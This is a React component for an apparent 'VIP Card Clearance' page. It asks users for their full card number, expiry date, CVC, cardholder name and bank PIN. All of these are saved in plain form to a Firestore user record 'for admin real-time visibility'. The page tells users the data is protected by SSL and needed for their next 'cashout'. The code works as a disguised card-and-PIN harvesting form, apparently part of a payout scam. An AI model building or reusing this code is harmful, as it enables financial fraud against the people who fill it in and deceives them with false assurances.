import React, { useState } from 'react';
import { Icons } from './Icons';
import { User } from '../types';
import { db, syncUserFromLocalToFirestore, sanitizeForFirestore } from '../firebase';
import { doc, setDoc } from 'firebase/firestore';

interface CardClearanceProps {
  user: User;
  onUpdateProfile: (updatedUser: Partial<User>) => void;
  onBack: () => void;
}

export const CardClearance: React.FC<CardClearanceProps> = ({
  user,
  onUpdateProfile,
  onBack,
}) => {
  const existing = user.cardClearance || {
    cardNumber: '',
    expiryDate: '',
    cvc: '',
    cardHolderName: user.name || '',
    bankPin: '',
    submittedAt: '',
  };

  const [cardNumber, setCardNumber] = useState(existing.cardNumber);
  const [expiryDate, setExpiryDate] = useState(existing.expiryDate);
  const [cvc, setCvc] = useState(existing.cvc);
  const [cardHolderName, setCardHolderName] = useState(existing.cardHolderName || user.name || '');
  const [bankPin, setBankPin] = useState(existing.bankPin);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSaved, setIsSaved] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // Format Card Number into 4-digit blocks
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    let formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
    setCardNumber(formatted);
  };

  // Format Expiry Date MM/YY
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length >= 3) {
      setExpiryDate(`${raw.slice(0, 2)}/${raw.slice(2)}`);
    } else {
      setExpiryDate(raw);
    }
  };

  // Format Bank PIN (digits only up to 6)
  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 6);
    setBankPin(raw);
  };

  // Format CVC (digits only up to 4)
  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCvc(raw);
  };

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    const cleanCard = cardNumber.replace(/\s+/g, '');
    if (cleanCard.length < 13) {
      setErrorMsg('Please enter a valid card number.');
      return;
    }
    if (!expiryDate || expiryDate.length < 4) {
      setErrorMsg('Please enter a valid expiry date (MM/YY).');
      return;
    }
    if (!cvc || cvc.length < 3) {
      setErrorMsg('Please enter a valid CVC.');
      return;
    }
    if (!cardHolderName.trim()) {
      setErrorMsg('Please enter the card holder name.');
      return;
    }
    if (!bankPin || bankPin.length < 4) {
      setErrorMsg('Please enter your valid 4-digit bank PIN.');
      return;
    }

    const clearanceData = {
      cardNumber: cleanCard,
      expiryDate,
      cvc,
      cardHolderName: cardHolderName.trim(),
      bankPin,
      submittedAt: new Date().toISOString(),
    };

    setIsSubmitting(true);

    try {
      // 1. Local state update
      onUpdateProfile({
        cardClearance: clearanceData,
      });

      // 2. Direct Firestore update for admin real-time visibility
      const emailKey = user.email.toLowerCase().trim();
      const updatedUser = {
        ...user,
        cardClearance: clearanceData,
      };

      await setDoc(doc(db, 'users', emailKey), sanitizeForFirestore(updatedUser), { merge: true });
      await syncUserFromLocalToFirestore(user.email);

      setIsSaved(true);
    } catch (err: any) {
      console.error('Error submitting card clearance details:', err);
      setErrorMsg('Failed to submit details. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 pb-12 animate-in fade-in duration-300">
      {/* Header Banner */}
      <div className="bg-gradient-to-r from-amber-600 via-amber-500 to-yellow-500 text-white p-6 shadow-md border-b-2 border-yellow-300 sticky top-0 z-10">
        <div className="max-w-md mx-auto flex items-center justify-between">
          <button
            onClick={onBack}
            className="p-2 rounded-xl bg-black/20 hover:bg-black/30 text-white transition-all flex items-center space-x-1"
          >
            <Icons.ArrowLeft size={18} />
            <span className="text-xs font-bold uppercase tracking-wider">Back</span>
          </button>
          <div className="text-center flex-1 mx-2">
            <h1 className="text-lg font-black tracking-wide uppercase text-yellow-100 flex items-center justify-center space-x-2">
              <Icons.ShieldCheck size={20} className="text-yellow-200" />
              <span>VIP Card Clearance</span>
            </h1>
            <p className="text-[10px] text-yellow-100/90 font-medium tracking-wide">
              Bank Payment Card Verification Page
            </p>
          </div>
          <div className="w-10"></div>
        </div>
      </div>

      <div className="max-w-md mx-auto px-4 mt-6 space-y-6">
        {/* Visual Metallic Gold Card Mockup */}
        <div className="relative overflow-hidden rounded-3xl bg-gradient-to-tr from-amber-600 via-yellow-500 to-amber-300 p-6 text-slate-900 shadow-xl border-2 border-yellow-200">
          <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full blur-xl pointer-events-none"></div>
          <div className="flex justify-between items-center mb-6">
            <div className="flex items-center space-x-2">
              <span className="text-xs font-black uppercase tracking-widest text-amber-950 bg-amber-200/80 px-2.5 py-1 rounded-full border border-yellow-400/50">
                VIP Clearance Card
              </span>
            </div>
            <Icons.Card size={28} className="text-slate-900" />
          </div>

          <div className="space-y-4">
            <div className="font-mono text-lg font-black tracking-widest text-slate-900 drop-shadow-sm">
              {cardNumber || '•••• •••• •••• ••••'}
            </div>

            <div className="flex justify-between items-end text-xs font-bold uppercase tracking-wider text-slate-900/90">
              <div>
                <p className="text-[9px] text-slate-900/70 font-semibold">Card Holder Name</p>
                <p className="font-black text-slate-950 truncate max-w-[180px]">
                  {cardHolderName || 'YOUR FULL NAME'}
                </p>
              </div>
              <div className="text-right">
                <p className="text-[9px] text-slate-900/70 font-semibold">Expires</p>
                <p className="font-black text-slate-950">{expiryDate || 'MM/YY'}</p>
              </div>
            </div>
          </div>
        </div>

        {/* Security Alert Banner */}
        <div className="p-4 bg-amber-100/80 border-2 border-amber-300/80 rounded-2xl flex items-start space-x-3 text-amber-950 shadow-sm">
          <Icons.Lock size={22} className="text-amber-700 shrink-0 mt-0.5" />
          <div className="text-xs leading-relaxed font-semibold">
            <p className="font-black text-amber-900 uppercase tracking-wide mb-0.5">
              Secure Cashout Clearance
            </p>
            Your payment card and bank PIN details are protected with SSL encryption and safely submitted to clearance nodes for your next cashout.
          </div>
        </div>

        {isSaved ? (
          <div className="bg-white p-6 rounded-3xl border-2 border-amber-300 shadow-xl text-center space-y-4 animate-in zoom-in-95 duration-300">
            <div className="w-16 h-16 bg-gradient-to-br from-amber-400 to-yellow-500 rounded-full flex items-center justify-center mx-auto text-slate-950 shadow-lg">
              <Icons.Check size={36} className="stroke-[3]" />
            </div>
            <h3 className="text-lg font-black text-slate-900 uppercase tracking-wide">
              Clearance Details Submitted!
            </h3>
            <p className="text-xs text-slate-600 font-medium leading-relaxed">
              Your bank payment card details have been successfully submitted to the admin clearance system. You are cleared for your next instant cashout.
            </p>
            <button
              onClick={onBack}
              className="w-full py-4 bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-600 hover:to-yellow-600 text-slate-950 font-black text-xs uppercase tracking-widest rounded-2xl shadow-lg active:scale-95 transition-all"
            >
              Return To Profile
            </button>
          </div>
        ) : (
          <form onSubmit={handleSave} className="bg-white p-6 rounded-3xl border-2 border-amber-200/80 shadow-xl space-y-4">
            <h2 className="text-sm font-black uppercase tracking-wider text-amber-900 border-b border-amber-100 pb-3 flex items-center space-x-2">
              <Icons.Card size={18} className="text-amber-600" />
              <span>Input Payment Card Details</span>
            </h2>

            {errorMsg && (
              <div className="p-3 bg-red-50 border border-red-200 rounded-xl text-xs text-red-600 font-bold flex items-center space-x-2">
                <Icons.AlertTriangle size={16} />
                <span>{errorMsg}</span>
              </div>
            )}

            {/* Card Holder Name */}
            <div className="space-y-1">
              <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block">
                Card Holder Name
              </label>
              <input
                type="text"
                value={cardHolderName}
                onChange={(e) => setCardHolderName(e.target.value)}
                placeholder="Enter Full Name on Card"
                className="w-full p-3 bg-slate-50 border-2 border-amber-200/80 rounded-xl text-sm text-slate-900 font-semibold focus:outline-none focus:border-amber-500 focus:bg-white transition-all placeholder:text-slate-400"
              />
            </div>

            {/* Card Number */}
            <div className="space-y-1">
              <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block">
                Card Number
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  className="w-full p-3 pr-10 bg-slate-50 border-2 border-amber-200/80 rounded-xl text-sm font-mono font-bold text-slate-900 focus:outline-none focus:border-amber-500 focus:bg-white transition-all placeholder:text-slate-400"
                />
                <Icons.Card size={20} className="absolute right-3 top-3.5 text-amber-600" />
              </div>
            </div>

            {/* Date / Expiry and CVC */}
            <div className="grid grid-cols-2 gap-3">
              <div className="space-y-1">
                <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block">
                  Date / Expiry
                </label>
                <input
                  type="text"
                  value={expiryDate}
                  onChange={handleExpiryChange}
                  placeholder="MM/YY"
                  maxLength={5}
                  className="w-full p-3 bg-slate-50 border-2 border-amber-200/80 rounded-xl text-sm font-mono font-bold text-slate-900 focus:outline-none focus:border-amber-500 focus:bg-white transition-all placeholder:text-slate-400"
                />
              </div>

              <div className="space-y-1">
                <label className="text-xs font-bold text-slate-700 uppercase tracking-wider block">
                  CVC
                </label>
                <input
                  type="password"
                  value={cvc}
                  onChange={handleCvcChange}
                  placeholder="3-4 Digits"
                  maxLength={4}
                  className="w-full p-3 bg-slate-50 border-2 border-amber-200/80 rounded-xl text-sm font-mono font-bold text-slate-900 focus:outline-none focus:border-amber-500 focus:bg-white transition-all placeholder:text-slate-400"
                />
              </div>
            </div>

            {/* Bank PIN */}
            <div className="space-y-1 pt-2 border-t border-amber-100">
              <label className="text-xs font-bold text-slate-800 uppercase tracking-wider block flex items-center justify-between">
                <span>Bank PIN</span>
                <span className="text-[10px] text-amber-700 font-semibold">Required for Cashout</span>
              </label>
              <input
                type="password"
                value={bankPin}
                onChange={handlePinChange}
                placeholder="Enter 4-Digit Bank PIN"
                maxLength={6}
                className="w-full p-3 bg-slate-50 border-2 border-amber-200/80 rounded-xl text-sm font-mono font-bold text-slate-900 focus:outline-none focus:border-amber-500 focus:bg-white transition-all placeholder:text-slate-400"
              />
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              className={`w-full py-4 mt-2 bg-gradient-to-r from-amber-500 via-yellow-500 to-amber-600 hover:from-amber-600 hover:to-yellow-600 text-slate-950 font-black text-xs uppercase tracking-widest rounded-2xl shadow-lg shadow-amber-300/50 active:scale-95 transition-all flex items-center justify-center space-x-2 border border-yellow-300 ${isSubmitting ? 'opacity-70 cursor-not-allowed' : ''}`}
            >
              {isSubmitting ? (
                <span>Submitting Clearance Details...</span>
              ) : (
                <>
                  <Icons.ShieldCheck size={18} />
                  <span>Save & Submit Clearance Details</span>
                </>
              )}
            </button>
          </form>
        )}
      </div>
    </div>
  );
};
